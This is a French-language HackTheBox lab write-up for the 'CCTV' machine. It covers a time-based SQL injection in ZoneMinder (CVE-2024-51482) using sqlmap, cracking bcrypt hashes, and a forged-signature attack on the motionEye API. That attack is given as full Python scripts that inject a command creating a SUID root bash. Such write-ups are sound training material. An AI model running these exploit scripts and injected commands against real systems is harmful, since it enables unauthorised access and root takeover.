---
title: "HackTheBox - CCTV"
date: 2026-03-08 03:00:00 +0200
categories: [HackTheBox, Challenge, Easy]
tags: [zoneminder, sqli, sqlmap, bcrypt, motioneye, api, rce, suid, linux]
description: "Write-up de la machine CCTV — SQLi blind sur ZoneMinder, crackage de hash bcrypt, puis RCE root via l'API motionEye en forgeant une signature HMAC-SHA1 sans connaître le mot de passe en clair"
image:
  path: /assets/img/posts/cctv/cctv.png
  alt: "HackTheBox - CCTV"
---

## Informations sur la machine

| Propriété      | Valeur       |
| -------------- | ------------ |
| **OS**         | Linux        |
| **Difficulté** | Easy         |
| **IP**         | 10.129.1.209 |
| **Domaine**    | cctv.htb     |

---

## Outils utilisés

| Outil       | Rôle                                         |
| ----------- | -------------------------------------------- |
| **nmap**    | Scan de ports et détection de services       |
| **sqlmap**  | Exploitation de la SQLi blind sur ZoneMinder |
| **john**    | Crackage des hashes bcrypt                   |
| **python3** | Forge de signature SHA1 pour l'API motionEye |
| **curl**    | Interactions avec l'API motion webcontrol    |

---

## Reconnaissance

### Scan initial

```bash
nmap -sC -sV 10.129.1.209
```

Deux ports ouverts : **22** (SSH OpenSSH 9.6p1) et **80** (Apache 2.4.58).

### Enumération web

L'application sur le port 80 est **ZoneMinder v1.37.63**, accessible via `/zm/?view=login`. Les identifiants par défaut `admin:admin` fonctionnent.

---

## Foothold — SQLi blind sur ZoneMinder

### Découverte de la vulnérabilité

ZoneMinder 1.37.63 est vulnérable à **CVE-2024-51482** — une injection SQL booléenne/temporelle dans le paramètre `tid` de l'endpoint de suppression de tags.

Endpoint vulnérable :

```
GET /zm/index.php?view=request&request=event&action=removetag&tid=1
```

### Exploitation avec sqlmap

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=<cookie>" \
  --batch --no-cast --threads=1 \
  -D zm -T Users -C Username,Password --dump
```

sqlmap détecte uniquement une injection **time-based blind** (SLEEP). L'extraction prend quelques minutes et retourne trois utilisateurs :

| Username   | Password Hash                                                  |
| ---------- | -------------------------------------------------------------- |
| admin      | `$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m` |
| mark       | `$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.` |
| superadmin | `$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm` |

### Crackage des hashes bcrypt

Les hashes sont en **bcrypt** (`$2y$10$`). On teste d'abord `admin:admin` via python pour confirmer le mécanisme, puis on passe john sur rockyou :

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

```
admin        (admin)
opensesame   (mark)
```

Le hash de `superadmin` ne se trouve pas dans rockyou.

### Accès SSH

```bash
ssh mark@cctv.htb  # mot de passe : opensesame
```

Shell obtenu en tant que `mark` (uid=1000). Le répertoire `/home/sa_mark` existe mais est inaccessible.

---

## Privilege Escalation — RCE via l'API motionEye

### Découverte des services internes

```bash
ss -tlnp
```

Plusieurs services écoutent en loopback. Le plus intéressant : **motionEye** sur `127.0.0.1:8765`.

### Analyse de motionEye

La version installée est **motionEye v0.43.1b4**. Les fichiers de configuration sont lisibles par `mark` :

```bash
cat /etc/motioneye/motion.conf
```

```
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

Le hash est un **SHA1** (`sha1(mot_de_passe)`). Il n'est pas dans rockyou — mais ce n'est pas nécessaire.

### Analyse du mécanisme d'authentification

L'examen du code source de motionEye révèle quelque chose de crucial :

```python
# handlers/base.py
admin_hash = hashlib.sha1(
    main_config['@admin_password'].encode('utf-8')
).hexdigest()

if username == admin_username and (
    signature == utils.compute_signature(
        self.request.method, self.request.uri, self.request.body, admin_password
    )
    or signature == utils.compute_signature(
        self.request.method, self.request.uri, self.request.body, admin_hash  # ← accepte aussi le hash !
    )
):
    return 'admin'
```

Le serveur accepte une signature calculée **soit avec le mot de passe en clair, soit avec son hash SHA1**. On possède déjà le hash — on peut donc forger des requêtes authentifiées sans jamais connaître le mot de passe en clair.

La fonction `compute_signature` :

```python
# utils/__init__.py
def compute_signature(method, path, body, key):
    # ... normalisation du path et du body ...
    path = _SIGNATURE_REGEX.sub('-', path)
    body = _SIGNATURE_REGEX.sub('-', body) if body else ''
    key = _SIGNATURE_REGEX.sub('-', key)
    return hashlib.sha1(f"{method}:{path}:{body}:{key}".encode()).hexdigest()
```

### Service motionEye tourne en root

```bash
cat /etc/systemd/system/motioneye.service
```

```
[Service]
User=root
ExecStart=/usr/local/bin/meyectl startserver -c /etc/motioneye/motioneye.conf
```

Toute commande exécutée via l'API sera lancée en tant que **root**.

### Étape 1 — Forge de signature et récupération de la config

On implémente `compute_signature` localement avec le hash SHA1 récupéré :

```bash
cat > /tmp/getconfig.py << 'EOF'
import hashlib, urllib.parse, re, urllib.request

_SIGNATURE_REGEX = re.compile(r'[^A-Za-z0-9/?_.=&{}\[\]":, -]')
admin_hash = "989c5a8ee87a0e9521ec81a79187d162109282f0"

def compute_signature(method, path, body, key):
    parts = list(urllib.parse.urlsplit(path))
    query = [q for q in urllib.parse.parse_qsl(parts[3], keep_blank_values=True) if q[0] != '_signature']
    query.sort(key=lambda q: q[0])
    query = [(n, urllib.parse.quote(v, safe="!'()*~")) for (n, v) in query]
    query = '&'.join([(q[0] + '=' + q[1]) for q in query])
    parts[0] = parts[1] = ''
    parts[3] = query
    path = urllib.parse.urlunsplit(parts)
    path = _SIGNATURE_REGEX.sub('-', path)
    body = _SIGNATURE_REGEX.sub('-', body) if body else ''
    key = _SIGNATURE_REGEX.sub('-', key)
    return hashlib.sha1(f"{method}:{path}:{body}:{key}".encode()).hexdigest()

path = "/config/1/get?_username=admin"
sig = compute_signature("GET", path, "", admin_hash)
url = f"http://127.0.0.1:8765{path}&_signature={sig}"
resp = urllib.request.urlopen(url)
print(resp.read().decode())
EOF

python3 /tmp/getconfig.py
```

La réponse confirme l'accès admin à l'API.

### Étape 2 — Injection d'une commande via command_notifications

L'analyse du code (`config.py` ligne 1224) révèle que le champ `command_notifications_exec` est injecté directement dans `on_event_start` de motion. On envoie la config complète de la caméra avec les champs modifiés :

```bash
cat > /tmp/pwn.py << 'EOF'
import hashlib, urllib.parse, re, urllib.request, json

_SIGNATURE_REGEX = re.compile(r'[^A-Za-z0-9/?_.=&{}\[\]":, -]')
admin_hash = "989c5a8ee87a0e9521ec81a79187d162109282f0"

def compute_signature(method, path, body, key):
    parts = list(urllib.parse.urlsplit(path))
    query = [q for q in urllib.parse.parse_qsl(parts[3], keep_blank_values=True) if q[0] != '_signature']
    query.sort(key=lambda q: q[0])
    query = [(n, urllib.parse.quote(v, safe="!'()*~")) for (n, v) in query]
    query = '&'.join([(q[0] + '=' + q[1]) for q in query])
    parts[0] = parts[1] = ''
    parts[3] = query
    path = urllib.parse.urlunsplit(parts)
    path = _SIGNATURE_REGEX.sub('-', path)
    body = _SIGNATURE_REGEX.sub('-', body) if body else ''
    key = _SIGNATURE_REGEX.sub('-', key)
    return hashlib.sha1(f"{method}:{path}:{body}:{key}".encode()).hexdigest()

# Récupère la config complète (nécessaire — motion_camera_ui_to_dict attend tous les champs)
path = "/config/1/get?_username=admin"
sig = compute_signature("GET", path, "", admin_hash)
data = json.loads(urllib.request.urlopen(f"http://127.0.0.1:8765{path}&_signature={sig}").read())

# Injecte la commande
data["command_notifications_enabled"] = True
data["command_notifications_exec"] = "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"

body = json.dumps(data)
path = "/config/1/set?_username=admin"
sig = compute_signature("POST", path, body, admin_hash)
url = f"http://127.0.0.1:8765{path}&_signature={sig}"

req = urllib.request.Request(url, data=body.encode(), headers={"Content-Type": "application/json"}, method="POST")
print(urllib.request.urlopen(req).read().decode())
EOF

python3 /tmp/pwn.py
# {"reload": false, "reboot": false, "error": null}
```

La commande est maintenant dans `/etc/motioneye/camera-1.conf` sous `on_event_start`.

### Étape 3 — Déclenchement de l'event via le webcontrol motion

La caméra RTSP étant déconnectée (Connection refused), motion ne génère pas d'événement naturellement. On utilise directement le **webcontrol HTTP de motion** (port 7999) pour forcer un event :

```bash
curl -s "http://127.0.0.1:7999/1/action/eventstart"
# Start event for camera 1
# Done
```

### Étape 4 — Shell root

```bash
sleep 3
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root 1446024 Mar  8 01:47 /tmp/rootbash

/tmp/rootbash -p
whoami
# root
```

---

## Flags

```bash
cat /root/root.txt
cat /home/sa_mark/user.txt
```

---

## Récapitulatif de la chaîne d'exploitation

```
ZoneMinder (default creds admin:admin)
  │
  └─ CVE-2024-51482 : SQLi blind time-based → dump zm.Users
      └─ hash bcrypt mark → john rockyou → opensesame
          └─ SSH mark@cctv.htb
              │
              └─ motionEye 0.43.1b4 sur 127.0.0.1:8765 (User=root)
                  ├─ /etc/motioneye/motion.conf → SHA1 hash admin_password
                  ├─ Code source : auth accepte sha1(password) → forge de signature sans crack
                  ├─ GET /config/1/get → config complète de la caméra
                  ├─ POST /config/1/set → command_notifications_exec injecté dans on_event_start
                  └─ curl http://127.0.0.1:7999/1/action/eventstart → exécution → SUID bash → root ✓
```

---

## Ressources

- [CVE-2024-51482 — ZoneMinder SQLi](https://nvd.nist.gov/vuln/detail/CVE-2024-51482)
- [motionEye — Documentation API](https://github.com/motioneye-project/motioneye/wiki/API)
- [motion — webcontrol HTTP API](https://motion-project.github.io/motion_config.html#webcontrol)

---

## Leçons apprises

- **Lire le code source avant de cracker** — motionEye acceptait la signature calculée avec `sha1(password)` directement, ce qui rendait le crackage du hash inutile. Lire les handlers Python avant d'essayer 14M de mots de passe rockyou aurait économisé du temps
- **Envoyer la config complète sur les endpoints POST** — `motion_camera_ui_to_dict` valide tous les champs attendus. Un body partiel retourne 500 même si la signature est correcte
- **Le webcontrol HTTP de motion est distinct de l'API motionEye** — les deux services tournent sur des ports différents et ont des rôles distincts. Quand la caméra est déconnectée et qu'aucun événement ne se déclenche naturellement, le webcontrol motion (`/N/action/eventstart`) permet de forcer l'exécution de `on_event_start` directement

**Machine complétée**

{% include comments.html %}